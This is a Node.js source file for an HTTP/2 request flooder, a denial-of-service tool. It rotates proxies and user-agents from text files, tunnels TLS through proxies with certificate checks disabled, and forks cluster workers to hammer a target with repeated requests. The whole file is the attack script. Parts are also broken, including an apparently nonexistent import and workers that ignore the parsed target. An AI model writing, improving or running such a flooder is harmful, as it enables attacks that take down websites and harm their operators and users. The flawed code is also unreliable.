const http2 = require('http2');
const fs = require('fs');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const net = require('net');
const { Http2OverHttpX } = require('http2-wrapper');

// Utility functions
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

// Read proxies and user-agents
const proxies = readLines('proxy.txt');
const userAgents = readLines('ua.txt');

// Adaptive Rate Limiter
class AdaptiveRateLimiter {
    constructor(maxRequestsPerSecond) {
        this.maxRequests = maxRequestsPerSecond;
        this.requests = 0;
        this.startTime = new Date().getTime();
        this.adjustmentFactor = 1.0;
    }

    check() {
        const currentTime = new Date().getTime();
        if (currentTime - this.startTime > 1000) {
            this.requests = 0;
            this.startTime = currentTime;
            this.maxRequests *= this.adjustmentFactor;
        }
        if (this.requests >= this.maxRequests) {
            this.adjustmentFactor *= 0.9; // Decrease rate if limit is hit
            return false;
        }
        this.requests++;
        return true;
    }

    increaseRate() {
        this.adjustmentFactor *= 1.1; // Increase rate if successful
    }
}

// Main class for network operations
class EnhancedNetSocket {
    constructor() {
        this.client = null;
    }

    async connect(options) {
        const proxy = randomElement(proxies).split(':');
        const proxyOptions = {
            host: proxy[0],
            port: parseInt(proxy[1]),
            rejectUnauthorized: false // Note: Consider security implications in production
        };

        return new Promise((resolve, reject) => {
            const socket = net.createConnection(proxyOptions, () => {
                const tlsSocket = tls.connect({
                    ...proxyOptions,
                    socket: socket, // Tunnel TLS over the proxy
                    servername: options.host // SNI
                });

                const client = http2.connect(`https://${options.host}:${options.port}`, {
                    createConnection: () => tlsSocket
                });
                client.on('error', (err) => reject(err));
                resolve(client);
            });

            socket.on('error', (err) => reject(err));
        });
    }

    async sendRequest(client, headers) {
        return new Promise((resolve, reject) => {
            const req = client.request(headers);
            req.on('response', (headers, flags) => {
                let data = '';
                req.on('data', chunk => { data += chunk; });
                req.on('end', () => {
                    resolve(data);
                });
            });
            req.on('error', (err) => {
                reject(err);
            });
            req.end();
        });
    }
}

// Function to run the flooder
async function runFlooder(target, options, limiter) {
    const socket = new EnhancedNetSocket();
    try {
        const client = await socket.connect({ host: target.host, port: 443 });
        const headers = {
            ':method': 'GET',
            ':path': '/',
            ':scheme': 'https',
            ':authority': target.host,
            'user-agent': randomElement(userAgents)
        };

        setInterval(async () => {
            if (limiter.check()) {
                try {
                    const response = await socket.sendRequest(client, headers);
                    console.log('Response:', response);
                    limiter.increaseRate(); // Increase rate on successful request
                } catch (error) {
                    console.error('Request failed:', error);
                }
            } else {
                console.log("Rate limit exceeded, waiting...");
            }
        }, 100); // Check every 100 ms
    } catch (error) {
        console.error('Error:', error);
    }
}

// Main execution logic
if (cluster.isMaster) {
    const args = {
        target: process.argv[2],
        time: parseInt(process.argv[3]),
        rate: parseInt(process.argv[4]),
        threads: parseInt(process.argv[5])
    };

    const parsedTarget = url.parse(args.target);

    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died.`);
    });
} else {
    const target = { host: 'example.com' }; // Replace with actual target
    const options = { rate: 1000, duration: 60 }; // Replace with actual options
    const limiter = new AdaptiveRateLimiter(10); // Start with 10 requests per second
    runFlooder(target, options, limiter);
}
